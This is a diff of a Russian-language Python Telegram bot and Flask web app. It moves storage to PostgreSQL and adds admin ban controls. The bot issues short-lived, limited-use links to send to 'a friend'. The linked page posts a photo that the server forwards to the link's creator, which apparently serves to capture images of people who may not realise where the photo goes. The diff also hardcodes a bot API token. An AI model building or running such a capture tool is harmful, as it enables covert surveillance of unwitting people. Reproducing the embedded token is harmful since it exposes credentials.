@@ -7,41 +7,234 @@ import os
 import base64
 import time
 import re
-import json
+import psycopg2
+from psycopg2.extras import RealDictCursor
+from datetime import datetime
 
 # ========== НАСТРОЙКИ ==========
-BOT_TOKEN = '8746122757:AAH25b7Feg42akLKgUx17z3qdOXD1xISugM'
+BOT_TOKEN = '8746122757:AAH25b7Feg42akLKgUx17z3qdo0XL1sUgM'
 BOT_USERNAME = 'genphototikbot'
-PORT = 5000
-MAX_USES = 3  # Максимум 3 человека на ссылку
+MAX_USES = 3
 
 # ID администратора (ВАШ ID Telegram)
 ADMIN_ID = 957881887  # ← ЗАМЕНИТЕ НА ВАШ ID!
 
-# Файл для хранения разрешённых пользователей
-ALLOWED_USERS_FILE = 'allowed_users.json'
+# Подключение к базе данных (Render даст переменную DATABASE_URL)
+DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://user:pass@localhost:5432/db')
 # ================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
 active_links = {}
 app = Flask(__name__)
 
-# Загрузка списка разрешённых пользователей
-def load_allowed_users():
-    if os.path.exists(ALLOWED_USERS_FILE):
-        with open(ALLOWED_USERS_FILE, 'r') as f:
-            return set(json.load(f))
-    return set()
+# ========== РАБОТА С БАЗОЙ ДАННЫХ ==========
+def init_db():
+    """Создание таблиц при первом запуске"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    
+    # Таблица пользователей
+    cur.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            user_id BIGINT PRIMARY KEY,
+            username TEXT,
+            is_allowed BOOLEAN DEFAULT FALSE,
+            is_banned BOOLEAN DEFAULT FALSE,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    # Таблица ссылок
+    cur.execute('''
+        CREATE TABLE IF NOT EXISTS links (
+            code TEXT PRIMARY KEY,
+            owner_id BIGINT,
+            uses INTEGER DEFAULT 0,
+            max_uses INTEGER DEFAULT 3,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            expires_at TIMESTAMP
+        )
+    ''')
+    
+    # Таблица запросов доступа
+    cur.execute('''
+        CREATE TABLE IF NOT EXISTS access_requests (
+            user_id BIGINT PRIMARY KEY,
+            username TEXT,
+            requested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    # Таблица забаненных
+    cur.execute('''
+        CREATE TABLE IF NOT EXISTS banned_users (
+            user_id BIGINT PRIMARY KEY,
+            reason TEXT,
+            banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    conn.commit()
+    cur.close()
+    conn.close()
 
-# Сохранение списка разрешённых пользователей
-def save_allowed_users(users):
-    with open(ALLOWED_USERS_FILE, 'w') as f:
-        json.dump(list(users), f)
+def get_user(user_id):
+    """Получить информацию о пользователе"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute('SELECT * FROM users WHERE user_id = %s', (user_id,))
+    user = cur.fetchone()
+    cur.close()
+    conn.close()
+    return user
 
-allowed_users = load_allowed_users()
+def add_user(user_id, username):
+    """Добавить нового пользователя"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('''
+        INSERT INTO users (user_id, username) 
+        VALUES (%s, %s) 
+        ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username
+    ''', (user_id, username))
+    conn.commit()
+    cur.close()
+    conn.close()
 
-# Хранение заявок на доступ
-access_requests = {}  # {user_id: {'username': name, 'message_id': msg_id}}
+def allow_user(user_id):
+    """Разрешить пользователю создавать ссылки"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('UPDATE users SET is_allowed = TRUE WHERE user_id = %s', (user_id,))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def deny_user(user_id):
+    """Запретить пользователю создавать ссылки"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('UPDATE users SET is_allowed = FALSE WHERE user_id = %s', (user_id,))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def ban_user(user_id, reason="Нарушение правил"):
+    """Заблокировать пользователя"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('INSERT INTO banned_users (user_id, reason) VALUES (%s, %s) ON CONFLICT DO NOTHING', (user_id, reason))
+    cur.execute('UPDATE users SET is_allowed = FALSE, is_banned = TRUE WHERE user_id = %s', (user_id,))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def unban_user(user_id):
+    """Разблокировать пользователя"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('DELETE FROM banned_users WHERE user_id = %s', (user_id,))
+    cur.execute('UPDATE users SET is_banned = FALSE WHERE user_id = %s', (user_id,))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def is_banned(user_id):
+    """Проверить, заблокирован ли пользователь"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('SELECT 1 FROM banned_users WHERE user_id = %s', (user_id,))
+    banned = cur.fetchone() is not None
+    cur.close()
+    conn.close()
+    return banned
+
+def save_access_request(user_id, username):
+    """Сохранить запрос на доступ"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('''
+        INSERT INTO access_requests (user_id, username) 
+        VALUES (%s, %s) 
+        ON CONFLICT (user_id) DO UPDATE SET requested_at = CURRENT_TIMESTAMP
+    ''', (user_id, username))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def remove_access_request(user_id):
+    """Удалить запрос на доступ"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('DELETE FROM access_requests WHERE user_id = %s', (user_id,))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def get_access_requests():
+    """Получить все запросы на доступ"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute('SELECT * FROM access_requests ORDER BY requested_at DESC')
+    requests = cur.fetchall()
+    cur.close()
+    conn.close()
+    return requests
+
+def get_allowed_users():
+    """Получить всех разрешённых пользователей"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute('SELECT user_id, username FROM users WHERE is_allowed = TRUE AND is_banned = FALSE')
+    users = cur.fetchall()
+    cur.close()
+    conn.close()
+    return users
+
+def save_link(code, owner_id, max_uses=MAX_USES):
+    """Сохранить ссылку в базу"""
+    expires_at = datetime.now() + timedelta(minutes=10)
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('''
+        INSERT INTO links (code, owner_id, max_uses, expires_at)
+        VALUES (%s, %s, %s, %s)
+    ''', (code, owner_id, max_uses, expires_at))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def get_link(code):
+    """Получить информацию о ссылке"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute('SELECT * FROM links WHERE code = %s', (code,))
+    link = cur.fetchone()
+    cur.close()
+    conn.close()
+    return link
+
+def delete_link(code):
+    """Удалить ссылку"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('DELETE FROM links WHERE code = %s', (code,))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def update_link_uses(code, uses):
+    """Обновить количество использований"""
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('UPDATE links SET uses = %s WHERE code = %s', (uses, code))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+# Инициализация базы данных
+from datetime import timedelta
+init_db()
 
 # ========== HTML СТРАНИЦА ==========
 HTML_PAGE = '''
@@ -105,16 +298,6 @@ HTML_PAGE = '''
             const urlParams = new URLSearchParams(window.location.search);
             if (urlParams.has('startapp')) {
                 code = urlParams.get('startapp');
-            } else if (urlParams.has('start_param')) {
-                code = urlParams.get('start_param');
-            }
-        }
-        
-        if (!code) {
-            const pathParts = window.location.pathname.split('/');
-            const lastPart = pathParts[pathParts.length - 1];
-            if (lastPart && lastPart !== 'webapp') {
-                code = lastPart;
             }
         }
         
@@ -171,6 +354,9 @@ HTML_PAGE = '''
                 } else if (result.error === 'limit_reached') {
                     statusDiv.innerHTML = '❌';
                     subDiv.innerHTML = 'Лимит использован';
+                } else if (result.error === 'not_found') {
+                    statusDiv.innerHTML = '❌';
+                    subDiv.innerHTML = 'Ссылка недействительна';
                 } else {
                     throw new Error();
                 }
@@ -189,10 +375,6 @@ HTML_PAGE = '''
 def webapp_root():
     return HTML_PAGE
 
-@app.route('/webapp/')
-def webapp_root_slash():
-    return HTML_PAGE
-
 @app.route('/webapp/<code>')
 def webapp_with_code(code):
     return HTML_PAGE
@@ -203,18 +385,22 @@ def receive_photo():
     link_code = data.get('code')
     photo_data = data.get('photo')
     
-    if not link_code or link_code not in active_links:
+    link_info = get_link(link_code)
+    
+    if not link_info:
         return jsonify({'success': False, 'error': 'not_found'}), 400
     
-    link_info = active_links[link_code]
+    # Проверка на истечение времени
+    if datetime.now() > link_info['expires_at']:
+        delete_link(link_code)
+        return jsonify({'success': False, 'error': 'expired'}), 400
     
-    if link_info['uses'] >= MAX_USES:
+    if link_info['uses'] >= link_info['max_uses']:
         return jsonify({'success': False, 'error': 'limit_reached'}), 400
     
-    chat_id = link_info['chat_id']
-    
-    link_info['uses'] += 1
-    link_info['users'].append(chat_id)
+    chat_id = link_info['owner_id']
+    new_uses = link_info['uses'] + 1
+    update_link_uses(link_code, new_uses)
     
     photo_data = re.sub('^data:image/.+;base64,', '', photo_data)
     photo_bytes = base64.b64decode(photo_data)
@@ -224,47 +410,47 @@ def receive_photo():
         f.write(photo_bytes)
     
     with open(temp_path, 'rb') as photo:
-        bot.send_photo(chat_id, photo, caption=f"✅ Фото! (Осталось: {MAX_USES - link_info['uses']})")
+        bot.send_photo(chat_id, photo, caption=f"✅ Фото! (Осталось: {link_info['max_uses'] - new_uses})")
     os.remove(temp_path)
     
-    if link_info['uses'] >= MAX_USES:
-        del active_links[link_code]
+    if new_uses >= link_info['max_uses']:
+        delete_link(link_code)
     
     return jsonify({'success': True})
 
-# ========== ПРОВЕРКА ПРАВ ДОСТУПА ==========
 def is_allowed(user_id):
-    return user_id == ADMIN_ID or user_id in allowed_users
+    if is_banned(user_id):
+        return False
+    user = get_user(user_id)
+    return user and user['is_allowed'] if user else False
 
-# ========== КОМАНДЫ БОТА ==========
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
     username = message.from_user.username or message.from_user.first_name
     
+    add_user(user_id, username)
+    
+    if is_banned(user_id):
+        bot.send_message(message.chat.id, "❌ *ДОСТУП ЗАБЛОКИРОВАН*\n\nВы не можете использовать этого бота.", parse_mode='Markdown')
+        return
+    
     if is_allowed(user_id):
-        # Разрешённый пользователь - показывает кнопку создания ссылки
         markup = types.InlineKeyboardMarkup()
         btn = types.InlineKeyboardButton('🔗 Создать ссылку', callback_data='create_link')
         markup.add(btn)
         bot.send_message(
             message.chat.id,
-            f"👋 Привет, {username}!\n\n"
-            f"Нажми на кнопку, чтобы создать ссылку.\n"
-            f"📊 Ссылка работает для {MAX_USES} человек.\n"
-            f"🔗 Друг перейдёт по ссылке и сделает фото.",
+            f"👋 Привет, {username}!\n\nНажми на кнопку, чтобы создать ссылку.\n📊 Ссылка работает для {MAX_USES} человек.",
             reply_markup=markup
         )
     else:
-        # Неразрешённый пользователь - просит разрешение
         markup = types.InlineKeyboardMarkup()
         btn = types.InlineKeyboardButton('📝 Запросить доступ', callback_data='request_access')
         markup.add(btn)
         bot.send_message(
             message.chat.id,
-            f"👋 Привет, {username}!\n\n"
-            f"❌ У вас нет доступа к созданию ссылок.\n\n"
-            f"Нажмите на кнопку, чтобы отправить запрос администратору.",
+            f"👋 Привет, {username}!\n\n❌ У вас нет доступа.\n\nНажмите на кнопку, чтобы отправить запрос администратору.",
             reply_markup=markup
         )
 
@@ -273,151 +459,123 @@ def handle_callback(call):
     user_id = call.from_user.id
     username = call.from_user.username or call.from_user.first_name
     
-    # Запрос доступа
     if call.data == 'request_access':
-        if user_id in access_requests:
-            bot.answer_callback_query(call.id, "Запрос уже отправлен!", show_alert=True)
+        if is_banned(user_id):
+            bot.answer_callback_query(call.id, "❌ Вы заблокированы!", show_alert=True)
             return
         
-        # Сохраняем запрос
-        access_requests[user_id] = {
-            'username': username,
-            'user_id': user_id,
-            'time': time.time()
-        }
+        save_access_request(user_id, username)
         
-        # Отправляем админу
         markup = types.InlineKeyboardMarkup()
         markup.row(
             types.InlineKeyboardButton('✅ РАЗРЕШИТЬ', callback_data=f'allow_{user_id}'),
-            types.InlineKeyboardButton('❌ ОТКЛОНИТЬ', callback_data=f'deny_{user_id}')
+            types.InlineKeyboardButton('❌ ОТКЛОНИТЬ', callback_data=f'deny_{user_id}'),
+            types.InlineKeyboardButton('🚫 ЗАБЛОКИРОВАТЬ', callback_data=f'ban_{user_id}')
         )
         
         bot.send_message(
             ADMIN_ID,
-            f"🔔 *НОВЫЙ ЗАПРОС ДОСТУПА*\n\n"
-            f"👤 Пользователь: @{username}\n"
-            f"🆔 ID: `{user_id}`\n"
-            f"📅 Время: {time.strftime('%H:%M:%S')}",
+            f"🔔 *НОВЫЙ ЗАПРОС*\n\n👤 @{username}\n🆔 `{user_id}`",
             parse_mode='Markdown',
             reply_markup=markup
         )
         
-        bot.answer_callback_query(call.id, "Запрос отправлен администратору!")
-        bot.send_message(call.message.chat.id, "✅ Запрос отправлен! Ожидайте подтверждения.")
+        bot.answer_callback_query(call.id, "Запрос отправлен!")
+        bot.send_message(call.message.chat.id, "✅ Запрос отправлен!")
     
-    # Создание ссылки (только для разрешённых)
     elif call.data == 'create_link':
         if not is_allowed(user_id):
-            bot.answer_callback_query(call.id, "❌ У вас нет доступа!", show_alert=True)
+            bot.answer_callback_query(call.id, "❌ Нет доступа!", show_alert=True)
             return
         
         code = secrets.token_urlsafe(16)
-        active_links[code] = {
-            'chat_id': call.message.chat.id,
-            'uses': 0,
-            'users': [],
-            'owner_id': user_id
-        }
+        save_link(code, call.message.chat.id)
         
         direct_link = f"https://t.me/{BOT_USERNAME}/webapp?startapp={code}"
         
         bot.send_message(
             call.message.chat.id,
-            f"✅ *Ссылка готова!*\n\n"
-            f"🔗 `{direct_link}`\n\n"
-            f"📤 Отправь эту ссылку другу.\n"
-            f"📊 Ссылка работает для *{MAX_USES} человек*.\n"
-            f"⚠️ Ссылка активна 10 минут.",
+            f"✅ *Ссылка готова!*\n\n🔗 `{direct_link}`\n\n📤 Отправь другу.\n⚠️ Активна 10 минут.\n📊 {MAX_USES} человека.",
             parse_mode='Markdown',
             disable_web_page_preview=True
         )
         
-        def delete_link():
+        def delete_link_task():
             time.sleep(600)
-            if code in active_links:
-                del active_links[code]
+            if get_link(code):
+                delete_link(code)
         
-        threading.Thread(target=delete_link, daemon=True).start()
+        threading.Thread(target=delete_link_task, daemon=True).start()
         bot.answer_callback_query(call.id)
     
-    # Разрешение доступа (только для админа)
     elif call.data.startswith('allow_'):
         if user_id != ADMIN_ID:
             bot.answer_callback_query(call.id, "Только для админа!")
             return
         
         target_id = int(call.data.split('_')[1])
-        allowed_users.add(target_id)
-        save_allowed_users(allowed_users)
+        allow_user(target_id)
+        remove_access_request(target_id)
         
-        # Удаляем запрос
-        if target_id in access_requests:
-            del access_requests[target_id]
+        bot.edit_message_text(f"✅ РАЗРЕШЁН: {target_id}", call.message.chat.id, call.message.message_id)
         
-        bot.edit_message_text(
-            f"✅ РАЗРЕШЁН: пользователь {target_id}",
-            call.message.chat.id,
-            call.message.message_id
-        )
-        
-        # Уведомляем пользователя
         try:
-            bot.send_message(
-                target_id,
-                "✅ *ДОСТУП РАЗРЁШЕН!*\n\n"
-                "Теперь вы можете создавать ссылки.\n"
-                "Отправьте /start чтобы начать.",
-                parse_mode='Markdown'
-            )
+            bot.send_message(target_id, "✅ *ДОСТУП РАЗРЁШЕН!*\n\nОтправьте /start", parse_mode='Markdown')
         except:
             pass
         
         bot.answer_callback_query(call.id, "Доступ разрешён!")
     
-    # Отклонение доступа (только для админа)
     elif call.data.startswith('deny_'):
         if user_id != ADMIN_ID:
             bot.answer_callback_query(call.id, "Только для админа!")
             return
         
         target_id = int(call.data.split('_')[1])
+        remove_access_request(target_id)
         
-        if target_id in access_requests:
-            del access_requests[target_id]
+        bot.edit_message_text(f"❌ ОТКЛОНЁН: {target_id}", call.message.chat.id, call.message.message_id)
         
-        bot.edit_message_text(
-            f"❌ ОТКЛОНЁН: пользователь {target_id}",
-            call.message.chat.id,
-            call.message.message_id
-        )
-        
-        # Уведомляем пользователя
         try:
-            bot.send_message(
-                target_id,
-                "❌ *ДОСТУП ОТКЛОНЁН*\n\n"
-                "К сожалению, администратор отклонил ваш запрос.",
-                parse_mode='Markdown'
-            )
+            bot.send_message(target_id, "❌ *ДОСТУП ОТКЛОНЁН*", parse_mode='Markdown')
         except:
             pass
         
         bot.answer_callback_query(call.id, "Доступ отклонён")
+    
+    elif call.data.startswith('ban_'):
+        if user_id != ADMIN_ID:
+            bot.answer_callback_query(call.id, "Только для админа!")
+            return
+        
+        target_id = int(call.data.split('_')[1])
+        ban_user(target_id)
+        remove_access_request(target_id)
+        
+        bot.edit_message_text(f"🚫 ЗАБЛОКИРОВАН: {target_id}", call.message.chat.id, call.message.message_id)
+        
+        try:
+            bot.send_message(target_id, "🚫 *ВЫ ЗАБЛОКИРОВАНЫ*\n\nДоступ к боту запрещён.", parse_mode='Markdown')
+        except:
+            pass
+        
+        bot.answer_callback_query(call.id, "Пользователь заблокирован")
 
-# ========== КОМАНДЫ АДМИНА ==========
 @bot.message_handler(commands=['users'])
 def list_users(message):
     if message.from_user.id != ADMIN_ID:
         return
     
-    if not allowed_users:
-        bot.send_message(ADMIN_ID, "📋 Нет разрешённых пользователей")
-        return
+    users = get_allowed_users()
+    requests = get_access_requests()
     
-    text = "📋 *РАЗРЕШЁННЫЕ ПОЛЬЗОВАТЕЛИ:*\n\n"
-    for uid in allowed_users:
-        text += f"• ID: `{uid}`\n"
+    text = "📋 *РАЗРЕШЁННЫЕ ПОЛЬЗОВАТЕЛИ:*\n"
+    for u in users:
+        text += f"• @{u['username'] or u['user_id']} (`{u['user_id']}`)\n"
+    
+    text += f"\n📝 *ЗАПРОСЫ НА ДОСТУП:*\n"
+    for r in requests:
+        text += f"• @{r['username'] or r['user_id']} (`{r['user_id']}`)\n"
     
     bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
 
@@ -429,34 +587,61 @@ def revoke_user(message):
     try:
         parts = message.text.split()
         if len(parts) != 2:
-            bot.send_message(ADMIN_ID, "Использование: /revoke ID_пользователя")
+            bot.send_message(ADMIN_ID, "Использование: /revoke ID")
             return
         
         target_id = int(parts[1])
-        if target_id in allowed_users:
-            allowed_users.remove(target_id)
-            save_allowed_users(allowed_users)
-            bot.send_message(ADMIN_ID, f"✅ Доступ отозван у пользователя {target_id}")
-        else:
-            bot.send_message(ADMIN_ID, f"❌ Пользователь {target_id} не найден")
+        deny_user(target_id)
+        bot.send_message(ADMIN_ID, f"✅ Доступ отозван у {target_id}")
     except:
-        bot.send_message(ADMIN_ID, "❌ Ошибка. ID должен быть числом")
+        bot.send_message(ADMIN_ID, "❌ Ошибка")
 
-# ========== ЗАПУСК ==========
+@bot.message_handler(commands=['unban'])
+def unban(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    try:
+        parts = message.text.split()
+        if len(parts) != 2:
+            bot.send_message(ADMIN_ID, "Использование: /unban ID")
+            return
+        
+        target_id = int(parts[1])
+        unban_user(target_id)
+        bot.send_message(ADMIN_ID, f"✅ Пользователь {target_id} разблокирован")
+    except:
+        bot.send_message(ADMIN_ID, "❌ Ошибка")
+
+@bot.message_handler(commands=['banned'])
+def list_banned(message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor(cursor_factory=RealDictCursor)
+    cur.execute('SELECT * FROM banned_users')
+    banned = cur.fetchall()
+    cur.close()
+    conn.close()
+    
+    if not banned:
+        bot.send_message(ADMIN_ID, "📋 Нет заблокированных пользователей")
+        return
+    
+    text = "🚫 *ЗАБЛОКИРОВАННЫЕ:*\n"
+    for b in banned:
+        text += f"• ID: `{b['user_id']}` - {b['reason']}\n"
+    bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
+
 def run_flask():
-    app.run(host='0.0.0.0', port=PORT, debug=False)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
 
 threading.Thread(target=run_flask, daemon=True).start()
 
 print("="*50)
 print("✅ БОТ ЗАПУЩЕН")
 print(f"🤖 Бот: @{BOT_USERNAME}")
-print(f"👑 Админ ID: {ADMIN_ID}")
-print(f"📊 Ссылка работает для {MAX_USES} человек")
-print("="*50)
-print("\n🔧 КОМАНДЫ АДМИНА:")
-print("   /users - список разрешённых пользователей")
-print("   /revoke ID - отозвать доступ")
 print("="*50)
 
 bot.polling(none_stop=True)
